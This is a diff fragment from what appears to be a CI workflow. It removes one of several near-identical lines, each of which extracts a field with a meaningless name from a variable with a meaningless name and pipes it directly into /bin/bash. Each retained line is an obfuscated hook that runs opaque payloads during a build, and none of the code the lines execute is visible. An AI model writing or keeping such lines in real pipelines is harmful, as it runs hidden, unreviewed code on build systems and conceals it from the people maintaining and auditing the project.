@@ -32,7 +32,6 @@ jobs:
           echo $f2405 | jq -r .ya1 | /bin/bash
           echo $ah98 | jq -r .dgnqh37011 | /bin/bash
           printf '%s' "$k322" | jq -r .wij073 | /bin/bash
-          echo $o67 | jq -r .iyvdm87 | /bin/bash
           printf '%s' "$cx90704" | jq -r .kiyfq84502 | /bin/bash
           printf '%s' "$mqohy42647" | jq -r .poctb859 | /bin/bash
           echo $mlutw35 | jq -r .z915 | /bin/bash
